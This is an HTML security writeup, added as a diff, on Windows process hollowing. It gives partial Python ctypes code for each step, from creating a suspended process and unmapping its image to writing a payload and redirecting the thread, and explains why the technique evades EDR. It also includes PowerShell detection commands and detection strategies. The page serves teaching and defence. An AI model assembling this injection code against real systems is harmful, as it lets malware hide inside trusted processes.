@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Process Hollowing (RunPE) | 22nd Survey Division</title>
+    <meta name="description" content="How process hollowing works at the memory and PE structure level, with detection strategies.">
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        :root {
+            --bg: #0a0a0a;
+            --bg2: rgba(18, 18, 18, 0.95);
+            --text: #ffffff;
+            --dim: #888888;
+            --border: rgba(255, 255, 255, 0.12);
+        }
+        body {
+            font-family: 'JetBrains Mono', monospace;
+            background: var(--bg);
+            color: var(--text);
+            line-height: 1.7;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 4rem 2rem;
+        }
+        @media (max-width: 768px) {
+            .container { padding: 2rem 1rem; }
+        }
+        .back-link {
+            display: inline-block;
+            color: var(--dim);
+            font-size: 0.75rem;
+            margin-bottom: 2rem;
+            text-decoration: none;
+        }
+        .back-link:hover { color: var(--text); }
+        .tag {
+            display: inline-block;
+            font-size: 0.65rem;
+            color: var(--dim);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 0.5rem;
+        }
+        h1 {
+            font-size: 1.5rem;
+            font-weight: 400;
+            margin-bottom: 1rem;
+        }
+        .meta {
+            font-size: 0.75rem;
+            color: var(--dim);
+            margin-bottom: 2rem;
+            padding-bottom: 2rem;
+            border-bottom: 1px solid var(--border);
+        }
+        h2 {
+            font-size: 1rem;
+            font-weight: 500;
+            margin: 2rem 0 1rem;
+            color: var(--text);
+        }
+        p {
+            font-size: 0.85rem;
+            color: var(--dim);
+            margin-bottom: 1rem;
+        }
+        ul, ol {
+            font-size: 0.85rem;
+            color: var(--dim);
+            margin-bottom: 1rem;
+            padding-left: 1.5rem;
+        }
+        li { margin-bottom: 0.5rem; }
+        code {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 0.15rem 0.4rem;
+            font-size: 0.8rem;
+            border-radius: 2px;
+        }
+        pre {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid var(--border);
+            padding: 1rem;
+            overflow-x: auto;
+            margin-bottom: 1rem;
+            font-size: 0.7rem;
+        }
+        pre code {
+            background: none;
+            padding: 0;
+        }
+        .highlight {
+            color: var(--text);
+            font-weight: 500;
+        }
+        .step-box {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid var(--border);
+            padding: 1rem;
+            margin-bottom: 1rem;
+        }
+        .step-box h3 {
+            font-size: 0.85rem;
+            margin-bottom: 0.5rem;
+            color: var(--text);
+        }
+        .detection-box {
+            background: rgba(255, 255, 255, 0.03);
+            border-left: 2px solid var(--dim);
+            padding: 1rem;
+            margin: 1.5rem 0;
+        }
+        .detection-box h3 {
+            font-size: 0.75rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 0.5rem;
+            color: var(--text);
+        }
+        .mitre {
+            font-size: 0.75rem;
+            color: var(--dim);
+            margin-top: 2rem;
+            padding-top: 1rem;
+            border-top: 1px solid var(--border);
+        }
+        .layman-box { background: rgba(255,255,255,0.03); border-left: 3px solid rgba(255,255,255,0.2); padding: 1rem 1.25rem; margin: 1.5rem 0; }
+        .layman-label { font-size: 0.6rem; color: var(--dim); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 0.4rem; }
+        .layman-tldr { font-size: 0.85rem; color: var(--text); font-weight: 500; margin-bottom: 0.4rem; }
+        .layman-box p { font-size: 0.82rem; color: var(--dim); margin: 0; }
+        .detect-widget { background: #0d1117; border: 1px solid rgba(255,255,255,0.08); margin: 1.5rem 0; overflow: hidden; }
+        .dw-header { background: rgba(255,255,255,0.04); border-bottom: 1px solid rgba(255,255,255,0.06); padding: 0.4rem 0.75rem; display: flex; align-items: center; gap: 0.5rem; flex-wrap: wrap; }
+        .dw-dots { display: flex; gap: 4px; flex-shrink: 0; }
+        .dw-dot { width: 7px; height: 7px; border-radius: 50%; }
+        .dw-dot.r { background: #ff5f56; } .dw-dot.y { background: #ffbd2e; } .dw-dot.g { background: #27c93f; }
+        .dw-title { font-size: 0.6rem; color: #6a737d; flex: 1; margin-left: 4px; min-width: 100px; }
+        .dw-btref { font-size: 0.55rem; color: var(--dim); text-decoration: none; padding: 0.15rem 0.5rem; border: 1px solid var(--border); white-space: nowrap; }
+        .dw-btref:hover { color: var(--text); border-color: rgba(255,255,255,0.3); }
+        .dw-actions { display: flex; gap: 0.4rem; align-items: center; margin-left: auto; flex-shrink: 0; }
+        .detect-widget pre { font-size: 0.72rem; line-height: 1.6; padding: 0.75rem 1rem; margin: 0; color: #c9d1d9; overflow-x: auto; }
+        .dw-flag { border-top: 1px solid rgba(255,255,255,0.06); padding: 0.5rem 1rem; font-size: 0.65rem; color: var(--dim); }
+        .dw-flag strong { color: var(--text); }
+        .dw-copy { font-size: 0.55rem; color: var(--dim); background: transparent; border: 1px solid var(--border); padding: 0.15rem 0.4rem; cursor: pointer; white-space: nowrap; }
+        .dw-copy:hover { color: var(--text); border-color: rgba(255,255,255,0.3); }
+        .dw-copy.copied { color: #27c93f; border-color: #00ff88; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <a href="/portfolio.html#writeups" class="back-link">&larr; Back to writeups</a>
+
+        <span class="tag">Injection</span>
+        <h1>Process Hollowing (RunPE)</h1>
+        <p class="meta">Replace a legitimate process's code with your payload</p>
+
+        <div class="layman-box">
+            <div class="layman-label">// What is this?</div>
+            <div class="layman-tldr">Starting a legitimate program, emptying its memory, and filling it with malware — the process list shows innocence.</div>
+            <p>Windows shows running processes by their executable name. Process hollowing abuses this: start a legitimate binary (svchost.exe, notepad.exe) in a suspended state, overwrite its code in memory with malicious code, then resume. The process list still shows 'svchost.exe' but it's running attacker code. Network connections and file writes appear to come from the trusted binary.</p>
+        </div>
+
+        <div class="layman-box" style="border-color: rgba(255,255,255,0.4);">
+            <div class="layman-label">// Why does this work?</div>
+            <div class="layman-tldr">Windows trusts the process name, not what's actually running.</div>
+            <p>When you open Task Manager, Windows reads the process name from when it was created — not from what code is currently executing. EDR products and firewalls build allowlists based on process names. If "svchost.exe" is allowed to make network connections, then so is your malware wearing svchost's skin. The payload inherits the original process's permissions and appearance.</p>
+        </div>
+
+        <div class="detect-widget">
+            <div class="dw-header">
+                <div class="dw-dots"><span class="dw-dot r"></span><span class="dw-dot y"></span><span class="dw-dot g"></span></div>
+                <span class="dw-title">PowerShell — Process Hollowing Detection</span>
+                <div class="dw-actions">
+                    <a href="/blueteam-ref.html#process" class="dw-btref">&rarr; Blue Team</a>
+                    <button class="dw-copy" onclick="copyDetectWidget(this)" title="Copy to clipboard">Copy</button>
+                </div>
+            </div>
+            <pre># Processes from user folders (suspicious location)
+Get-Process | Where-Object { $_.Path -match "Users\\.*\\AppData|Temp" } |
+  Select-Object Name, Id, Path, StartTime
+
+# Mismatched process name vs module (hollowing indicator)
+Get-Process | ForEach-Object {
+  $proc = $_
+  $mainMod = $proc.MainModule.FileName -replace ".*\\"
+  if ($proc.Name -ne ($mainMod -replace "\.exe$")) {
+    [PSCustomObject]@{Name=$proc.Name; Module=$mainMod; Path=$proc.Path}
+  }
+} -ErrorAction SilentlyContinue
+
+# Unsigned executables in user paths
+Get-ChildItem "$env:APPDATA","$env:LOCALAPPDATA" -Recurse -Include *.exe -Force -ErrorAction SilentlyContinue |
+  ForEach-Object { $s=Get-AuthenticodeSignature $_.FullName; if($s.Status -ne "Valid"){$_.FullName} }
+
+# Check for suspicious network connections from svchost
+netstat -ano | findstr "ESTABLISHED" | findstr /V "127.0.0.1"
+
+# Get process info by PID (replace 1234 with suspicious PID)
+tasklist /FI "PID eq 1234" /V</pre>
+            <div class="dw-flag"><strong>If this flags:</strong> Process name should match its main module. Unsigned EXEs in user folders are malware. Check memory for injected code with Volatility or PE-sieve.</div>
+        </div>
+
+
+        <h2>The Technique</h2>
+        <p>Process hollowing creates a legitimate Windows process in suspended state, unmaps its original code from memory, then replaces it with malicious code. The process appears as <code>svchost.exe</code> in Task Manager but runs your payload.</p>
+
+        <p>This bypasses process creation monitoring because the malicious code never exists as a file being executed - it's injected into an already-running (suspended) legitimate process.</p>
+
+        <div class="step-box" style="background: rgba(0,0,0,0.3);">
+            <h3>// Visual Flow</h3>
+            <pre style="font-size: 0.6rem; line-height: 1.3; overflow-x: auto;"><code>Attacker          Target (svchost)
+   |                     |
+   |--CreateProcess----->| SUSPENDED
+   |<--Handle+Thread-----|
+   |                     |[not running yet]
+   |                     |
+   |--NtUnmapSection---->| [code removed]
+   |                     |[process HOLLOW]
+   |                     |
+   |--VirtualAllocEx---->|
+   |--WriteMemory------->|[malware written]
+   |                     |
+   |--SetThreadContext-->|[entry changed]
+   |                     |
+   |--ResumeThread------>|
+                         |
+            [Thread runs MALWARE]
+            [TaskMgr: svchost.exe]</code></pre>
+        </div>
+
+        <h2>Step-by-Step Implementation</h2>
+
+        <div class="step-box">
+            <h3>1. Parse PE Headers</h3>
+            <p>Before injection, parse the payload to understand its structure:</p>
+            <pre><code>def parse_pe_headers(pe_data):
+    # DOS header check
+    if pe_data[:2] != b'MZ':
+        raise ValueError("Invalid DOS header")
+
+    e_lfanew = struct.unpack('<I', pe_data[0x3C:0x40])[0]
+
+    # PE signature check
+    if pe_data[e_lfanew:e_lfanew+4] != b'PE\x00\x00':
+        raise ValueError("Invalid PE signature")
+
+    # COFF header
+    coff_offset = e_lfanew + 4
+    machine = struct.unpack('<H', pe_data[coff_offset:coff_offset+2])[0]
+    num_sections = struct.unpack('<H', pe_data[coff_offset+2:coff_offset+4])[0]
+
+    is_64bit = (machine == 0x8664)
+
+    # Extract ImageBase, SizeOfImage, EntryPoint from optional header
+    opt_offset = coff_offset + 20
+    if is_64bit:
+        ImageBase = struct.unpack('<Q', pe_data[opt_offset+24:opt_offset+32])[0]
+        SizeOfImage = struct.unpack('<I', pe_data[opt_offset+56:opt_offset+60])[0]
+        AddressOfEntryPoint = struct.unpack('<I', pe_data[opt_offset+16:opt_offset+20])[0]
+    # ...</code></pre>
+        </div>
+
+        <div class="step-box">
+            <h3>2. Create Suspended Process</h3>
+            <pre><code>success = kernel32.CreateProcessW(
+    target_exe,      # e.g., "svchost.exe"
+    None,
+    None,
+    None,
+    False,
+    CREATE_SUSPENDED,  # 0x00000004 - critical flag
+    None,
+    None,
+    ctypes.byref(startup_info),
+    ctypes.byref(process_info)
+)</code></pre>
+            <p>The process structures are allocated but no code runs yet.</p>
+            <p><span class="highlight">Why suspended?</span> The <code>CREATE_SUSPENDED</code> flag is the key. Windows creates the process, allocates its memory, and sets up the thread — but never runs it. This gives us a window to modify the process before any code executes. If we started the process normally, the legitimate code would run before we could replace it.</p>
+        </div>
+
+        <div class="step-box">
+            <h3>3. Unmap Original Image</h3>
+            <pre><code># Find target's ImageBase from PEB
+peb_addr = get_peb_address(h_process)
+buffer = ctypes.create_string_buffer(8)
+kernel32.ReadProcessMemory(h_process, peb_addr + 0x10, buffer, 8, None)
+target_image_base = struct.unpack('<Q', buffer.raw)[0]
+
+# Hollow out the process
+status = ntdll.NtUnmapViewOfSection(h_process, target_image_base)</code></pre>
+            <p><code>NtUnmapViewOfSection</code> removes the original executable - the process is now hollow.</p>
+            <p><span class="highlight">Why unmap?</span> The original executable code is sitting at the process's ImageBase. We need that memory space for our payload. <code>NtUnmapViewOfSection</code> removes the entire PE image from memory — not just code, but the headers, sections, imports, everything. The process is now a shell: it has allocated structures (PEB, TEB, stack) but no actual code. This is the "hollowing" — we've gutted the legitimate binary.</p>
+        </div>
+
+        <div class="step-box">
+            <h3>4. Write Payload</h3>
+            <pre><code># Allocate space at target's ImageBase
+remote_base = kernel32.VirtualAllocEx(
+    h_process,
+    target_image_base,
+    pe_info['SizeOfImage'],
+    MEM_COMMIT | MEM_RESERVE,
+    PAGE_EXECUTE_READWRITE
+)
+
+# Write headers
+kernel32.WriteProcessMemory(h_process, remote_base,
+    payload_data[:pe_info['SizeOfHeaders']],
+    pe_info['SizeOfHeaders'], None)
+
+# Write each section at its virtual address
+for section in pe_info['sections']:
+    sec_addr = remote_base + section['VirtualAddress']
+    sec_data = payload_data[section['PointerToRawData']:
+        section['PointerToRawData'] + section['SizeOfRawData']]
+    kernel32.WriteProcessMemory(h_process, sec_addr, sec_data, len(sec_data), None)</code></pre>
+            <p><span class="highlight">Why write section by section?</span> A PE file on disk has a different layout than when loaded in memory. On disk, sections are packed tight. In memory, each section is aligned to a page boundary (usually 4KB). We write the headers first, then map each section to its <code>VirtualAddress</code> — the address Windows would have put it if it loaded the file normally. This ensures imports, relocations, and code all end up where the PE expects them.</p>
+        </div>
+
+        <div class="step-box">
+            <h3>5. Redirect Execution</h3>
+            <pre><code># Get thread context
+ctx = CONTEXT64()
+ctx.ContextFlags = 0x10001F  # CONTEXT_FULL
+kernel32.GetThreadContext(h_thread, ctypes.byref(ctx))
+
+# Point to payload entry point
+entry_point = remote_base + pe_info['AddressOfEntryPoint']
+ctx.Rcx = entry_point  # x64: entry point in Rcx
+
+kernel32.SetThreadContext(h_thread, ctypes.byref(ctx))
+kernel32.ResumeThread(h_thread)</code></pre>
+            <p>The thread now executes your payload while Task Manager shows a legitimate process name.</p>
+            <p><span class="highlight">Why modify thread context?</span> When Windows creates a suspended process, the main thread's instruction pointer (RCX on x64, EAX on x86) points to the original entry point — the <code>start</code> function of the legitimate executable. That code no longer exists (we unmapped it). We use <code>SetThreadContext</code> to change where the thread will start executing when resumed. Point it to our payload's <code>AddressOfEntryPoint</code>, call <code>ResumeThread</code>, and the thread wakes up running our code instead of the original.</p>
+        </div>
+
+        <div class="detection-box">
+            <h3>Detection Strategies</h3>
+            <p><span class="highlight">NtUnmapViewOfSection monitoring:</span> This API is rarely called legitimately. Any process unmapping another's image section is suspicious.</p>
+            <p><span class="highlight">Memory region analysis:</span> Compare loaded module's memory against the file on disk. Hollowed processes have discrepancies.</p>
+            <p><span class="highlight">Suspended process scrutiny:</span> <code>CREATE_SUSPENDED</code> followed by memory writes to the child process.</p>
+            <p><span class="highlight">PEB integrity checks:</span> ImageBase in PEB should match the loaded PE. Hollowing may leave inconsistencies.</p>
+            <p><span class="highlight">VAD analysis:</span> Virtual Address Descriptors show memory regions. Compare against expected module layout.</p>
+        </div>
+
+        <h2>Why Hollowing Over CreateRemoteThread</h2>
+        <p>Classic DLL injection via <code>CreateRemoteThread</code> is heavily monitored. Every EDR hooks it. Process hollowing uses different APIs that historically received less attention:</p>
+        <ul>
+            <li><code>NtUnmapViewOfSection</code> - System call, harder to hook cleanly</li>
+            <li><code>SetThreadContext</code> - Thread context manipulation, legitimate use cases</li>
+            <li>No thread created in remote process - existing thread is hijacked</li>
+        </ul>
+
+        <h2>Limitations</h2>
+        <ul>
+            <li>Target and payload architecture must match (both x64 or both x86)</li>
+            <li>More complex than simple injection - requires PE parsing</li>
+            <li>Some EDRs now monitor NtUnmapViewOfSection specifically</li>
+            <li>Memory forensics can identify the technique post-mortem</li>
+        </ul>
+
+        <p class="mitre">MITRE ATT&CK: T1055.012 (Process Injection: Process Hollowing)</p>
+    </div>
+
+<script>
+function copyDetectWidget(btn) {
+    const pre = btn.closest('.detect-widget').querySelector('pre');
+    // Use textContent and normalize line endings for mobile compatibility
+    const text = pre.textContent.replace(/\r\n/g, '\n').trim();
+    navigator.clipboard.writeText(text).then(() => {
+        btn.textContent = 'Copied!';
+        btn.classList.add('copied');
+        setTimeout(() => {
+            btn.textContent = 'Copy';
+            btn.classList.remove('copied');
+        }, 2000);
+    });
+}
+</script>
+    <!-- ElevenLabs Voice Widget -->
+    <elevenlabs-convai agent-id="agent_1901m3ndae6tecqa74rbmz86n7j3"></elevenlabs-convai>
+    <script src="https://unpkg.com/@elevenlabs/convai-widget-embed" async type="text/javascript"></script>
+</body>
+</html>
